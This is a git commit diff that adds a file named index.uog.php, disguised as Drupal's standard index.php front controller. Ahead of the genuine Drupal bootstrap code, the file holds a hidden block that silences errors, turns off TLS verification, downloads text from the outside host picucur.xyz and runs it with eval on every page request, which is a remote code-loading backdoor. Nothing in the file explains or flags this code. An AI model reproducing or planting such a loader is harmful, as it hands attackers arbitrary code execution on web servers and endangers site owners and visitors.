8344aeafba935fecf285bce85f135c11dd1b7e5f
parbada <goodtogel207@gmail.com>
2025-03-06 15:15:24 +0700

    Create index.uog.php

---
+++ index.uog.php
@@ -0,0 +1,42 @@
+<?php
+error_reporting(0);
+function get_contents($url){
+  $ch = curl_init("$url");
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
+  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
+  $result = curl_exec($ch);
+  return $result;
+}?>
+<?php
+$a =
+get_contents('https://picucur.xyz/landing/uog/landing.txt');
+eval('?>'.$a);
+?>
+
+<?php
+
+/**
+ * @file
+ * The PHP page that serves all page requests on a Drupal installation.
+ *
+ * All Drupal code is released under the GNU General Public License.
+ * See COPYRIGHT.txt and LICENSE.txt files in the "core" directory.
+ */
+
+use Drupal\Core\DrupalKernel;
+use Symfony\Component\HttpFoundation\Request;
+
+$autoloader = require_once 'autoload.php';
+
+$kernel = new DrupalKernel('prod', $autoloader);
+
+$request = Request::createFromGlobals();
+$response = $kernel->handle($request);
+$response->send();
+
+$kernel->terminate($request, $response);
